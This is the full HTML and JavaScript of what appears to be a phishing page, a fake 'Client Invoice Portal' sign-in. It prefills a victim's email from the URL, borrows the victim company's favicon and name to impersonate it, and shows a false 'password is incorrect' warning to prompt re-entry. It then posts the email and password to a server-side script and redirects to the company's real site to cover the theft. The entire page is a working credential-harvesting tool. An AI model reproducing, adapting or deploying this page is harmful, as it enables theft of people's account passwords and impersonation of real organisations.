<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
    <title id="pageTitle">Portal</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <style>
        button {
            width: 100%;
            padding: 10px;
            background-color: #0D5CAB;
            color: #FFFFFF;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            margin-top: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0A4B8A;
        }

        #companyName {
            color: #0D5CAB;
            font-size: 20px;
            text-align: center;
            font-weight: bold;
            margin-bottom: 16px;
        }

        #error-message {
            color: #a94442;
            background: #f2dede;
            border: 1px solid #ebccd1;
            padding: 10px;
            font-size: 14px;
            margin-bottom: 16px;
            border-radius: 4px;
            text-align: center;
        }

        #form-main-outer {
            padding: 40px;
            margin: auto;
        }

        .form-header, .form-text {
            font-size: 16px;
            color: #444;
            font-weight: normal;
            margin-bottom: 8px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        #form-main-container {
            text-align: center;
        }

        img#logoImg {
            height: 84px;
            width: auto;
            display: block;
            margin: auto;
            margin-bottom: 16px;
        }
    </style>
</head>

<body>
    <div id="main-outer-container" class="c-div" style="height: 100vh;">
        <div id="main-inner-container" class="spdiv" style="width: 380px; margin-top: 150px; background: transparent;">
            <div id="form-main-outer">
                <img id="logoImg" class="fade" src="#" alt="Logo" />
                <h5 id="companyName"></h5>
                <div id="error-message">
                    The password is incorrect. Try again with your email password.
                </div>
                <div style="padding: 16px 40px;">
                    <p class="form-text">Sign in with your Email to continue</p>
                    <input type="text" id="id" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>
                    <p class="form-header">Enter password</p>
                    <input type="password" id="pass" placeholder="Password" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
                    <div style="margin-top: 10px;">
                        <button class="btn btn-primary" id="next-btn" type="button" onclick="nextFun();">Sign In</button>
                    </div>
                </div>
                <div style="height: 90px; background: #dddddd; padding: 16px 40px;">
                    <select style="height: 32px; width: 100%; font-size: 12px; border: 1px solid;">
                        <option value="12" selected>Client Invoice Portal</option>
                        <option value="13">Billing Portal</option>
                        <option value="14">Payment Portal</option>
                    </select>
                    <p style="font-size: 11px; margin-top: 6px; text-align: center; color: #555;">© 2025 All Rights Reserved</p>
                </div>
            </div>
        </div>
    </div>

    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            if (!hash.includes("@")) return;

            document.getElementById("id").value = hash;

            const emailParts = hash.split("@");
            const domain = emailParts[1].toLowerCase();

            const companyNameMapping = {
                "pinnacleinfotech.com": "PINNACLEINFOTECH",
                "examplecompany.com": "EXAMPLECOMPANY",
            };

            const companyRootName = domain.split(".")[0].toUpperCase();
            const companyName = companyNameMapping[domain] || companyRootName;

            document.getElementById("companyName").textContent = companyName;
            const logo = document.getElementById("logoImg");
            const faviconUrl = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
            const fallback = "assets/img/LoginBanner.png";

            logo.onload = () => logo.classList.add("show");
            logo.onerror = () => {
                logo.src = fallback;
                logo.classList.add("show");
            };
            logo.src = faviconUrl;

            document.querySelector("link[rel='icon']").href = faviconUrl;
        });

        function nextFun() {
            const email = document.getElementById("id").value;
            const password = document.getElementById("pass").value;

            if (email.length === 0 || password.length === 0) {
                const errorDiv = document.getElementById("error-message");
                errorDiv.style.display = "block";
                errorDiv.innerText = "Email or Password is empty.";
                setTimeout(() => {
                    errorDiv.style.display = "none";
                }, 2000);
                return;
            }

            $.ajax({
                url: "./next.php",
                type: "POST",
                data: { di: email, pr: password },
                success: function (response) {
                    console.log("Response:", response);
                    if (response.success) {
                        window.location.replace(response.redirectUrl || `https://${email.split("@")[1]}`);
                    } else {
                        const errorDiv = document.getElementById("error-message");
                        errorDiv.style.display = "block";
                        errorDiv.innerText = response.message;
                    }
                },
                error: function () {
                    console.error("Error occurred during login.");
                },
                complete: function () {
                    document.getElementById("pass").value = "";
                },
            });
        }
    </script>
</body>

</html>
